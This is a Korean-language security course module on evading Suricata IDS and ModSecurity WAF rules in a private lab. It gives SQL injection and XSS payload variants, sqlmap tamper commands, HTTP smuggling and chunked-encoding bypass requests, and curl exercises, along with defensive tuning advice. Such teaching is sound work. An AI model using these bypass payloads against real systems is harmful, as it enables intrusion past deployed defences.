# Week 10 — IDS / WAF 우회

> 본 주차는 본 lab 의 Suricata + ModSec 의 paranoia / threshold 우회 패턴. 단순
> 페이로드 변형 + tamper script + protocol abuse 로 detection 회피.

## 학습 목표

1. Suricata 룰의 content / pcre 매칭 회피 패턴
2. ModSec CRS 의 paranoia 1 우회 패턴
3. sqlmap --tamper 스크립트
4. HTTP smuggling / chunked encoding 우회
5. encoding 변형 (URL / HTML entity / unicode)
6. 운영 권장 — paranoia 상승의 trade-off

## 1. 페이로드 변형

### 1.1 공백 변형

```
원본:   ' OR '1'='1
변형:   '/*comment*/OR/*comment*/'1'='1
변형:   '+OR+'1'='1
변형:   '/**/OR/**/'1'='1
변형:   ' OR\n'1'='1                   # \n 추가
```

### 1.2 case mixing

```
원본:   union select
변형:   UnIoN SeLeCt
```

### 1.3 encoding

```
원본:   <script>
변형:   %3Cscript%3E (URL)
변형:   &#60;script&#62; (HTML entity)
변형:   <script> (unicode)
```

## 2. sqlmap --tamper

```
sqlmap --tamper=space2comment       # 공백 → /**/
sqlmap --tamper=randomcase          # 대소문자 random
sqlmap --tamper=between             # = → BETWEEN
sqlmap --tamper=charunicodeescape   # unicode escape
sqlmap --tamper=apostrophenullencode # ' → null byte
```

여러 tamper 동시:
```
sqlmap --tamper=space2comment,randomcase,between
```

## 3. HTTP smuggling

```
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target
...
```

front-end (HAProxy) 와 back-end (Apache) 의 CL vs TE 해석 차이로 두 번째 request 가
admin 으로 라우팅.

## 4. chunked encoding 우회

```
POST / HTTP/1.1
Content-Length: 100
Transfer-Encoding: chunked

5;header=garbage
union
0
```

WAF 가 chunked 의 일부만 검사 → 본 payload 우회.

## 5. 6v6-ips Suricata 우회 패턴

```
# 원본 (Suricata content 매치)
GET /admin

# 변형 1: URL 끝에 garbage
GET /admin?_=garbage

# 변형 2: case
GET /Admin

# 변형 3: encoding
GET /%61dmin
```

## 6. 운영 권장 (방어 관점)

- paranoia 1 의 우회 가능성을 고려해 paranoia 2 점진 상승
- ModSec 의 unicode normalization 활성
- Suricata 의 http.uri vs http.uri.raw 구분
- threshold 의 균형 (count 5 seconds 60 권장)

## 7. 실습 1~4

### 1 — paranoia 1 우회 시도

```bash
# XSS payload 4 변형의 ModSec 차단 비교
#   각 변형이 paranoia 1 룰을 어떻게 회피 (또는 못 회피) 하는가
ssh 6v6-attacker '
# 변형 0 (원본): <script>alert(1)</script>
#   ModSec 941100 (libinjection-XSS) 가 강력 매치 → 403 예상
curl -s -o /dev/null -w "원본:    %{http_code}\n" \
    -H "Host: juice.6v6.lab" \
    "http://10.20.30.1/?q=<script>alert(1)</script>"

# 변형 1 (case): <ScRiPt> 대소문자 mixing
#   CRS 룰이 nocase 적용 → 차단 여전 (403 예상)
curl -s -o /dev/null -w "case:    %{http_code}\n" \
    -H "Host: juice.6v6.lab" \
    "http://10.20.30.1/?q=<ScRiPt>alert(1)</ScRiPt>"

# 변형 2 (URL encoding): %3C%3E 로 < > 변환
#   ModSec 의 URL decode 단계가 정상 동작 시 차단 (403)
curl -s -o /dev/null -w "url-enc: %{http_code}\n" \
    -H "Host: juice.6v6.lab" \
    "http://10.20.30.1/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

# 변형 3 (nested tag): <sc<script>ript>
#   브라우저는 처음 <script> 만 parse → 결과적 <script>ript>alert ...
#   ModSec 의 libinjection 이 정교히 매치 (대부분 차단)
curl -s -o /dev/null -w "nested:  %{http_code}\n" \
    -H "Host: juice.6v6.lab" \
    "http://10.20.30.1/?q=<sc<script>ript>alert(1)</script>"
'
# 예상 결과 (paranoia 1):
#   원본:    403  (libinjection 매치)
#   case:    403  (nocase modifier)
#   url-enc: 403  (CRS URL decode 후 매치)
#   nested:  403  (libinjection 정교 매치)
# 일부 paranoia 1 우회 가능 → paranoia 2 권장 (W06 참조)
```

### 2 — sqlmap tamper

```bash
# sqlmap 의 tamper script — payload 자동 변형
#   --tamper=space2comment: 공백 ' ' → /**/ (SQL comment, 공백 동등)
#     예: '1 OR 1=1' → '1/**/OR/**/1=1'
#   --batch: 모든 질문 자동 yes
#   --headers: HAProxy vhost
#   timeout 30: 30초 후 중단 (학습 환경 부하 방지)
ssh 6v6-attacker 'timeout 30 sqlmap -u "http://10.20.30.1/?q=1" \
    --batch \
    --tamper=space2comment \
    --headers="Host: dvwa.6v6.lab" 2>&1 | tail -10' || true
# 결과 분석:
#   "[INFO] testing..." 후 vulnerable 발견 → tamper 우회 성공
#   "[CRITICAL] not injectable" → tamper 우회 실패 → paranoia 1 강력
# 다양한 tamper:
#   randomcase / charunicodeescape / between / equaltolike / apostrophenullencode
```

### 3 — ModSec 차단 카운트 비교

```
ssh 6v6-web 'sudo cat /var/log/apache2/modsec_audit.log | jq -r .transaction.response.http_code 2>/dev/null | sort | uniq -c | head'
```

### 4 — Suricata 우회 시도

```
# /admin URI 매칭 룰 (W04 의 9000041) 변형
ssh 6v6-attacker '
for p in "/admin" "/Admin" "/admin?_=g" "/%61dmin" "/.admin"; do
    curl -s -o /dev/null -w "$p: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1$p"
done
'
sleep 3
ssh 6v6-ips 'sudo grep "9000041" /var/log/suricata/eve.json | tail -5 | jq -r .http.url'
```

## 8. 과제

A. 우회 매트릭스 (필수) — 5 페이로드 × 5 우회 = 25 case
B. tamper 분석 (심화)
C. 방어 측 분석 (정성)

## 9. W11 (권한 상승) 예고

attacker 가 web shell 획득 → 권한 상승 → root → 본 lab 의 학습용 시나리오.
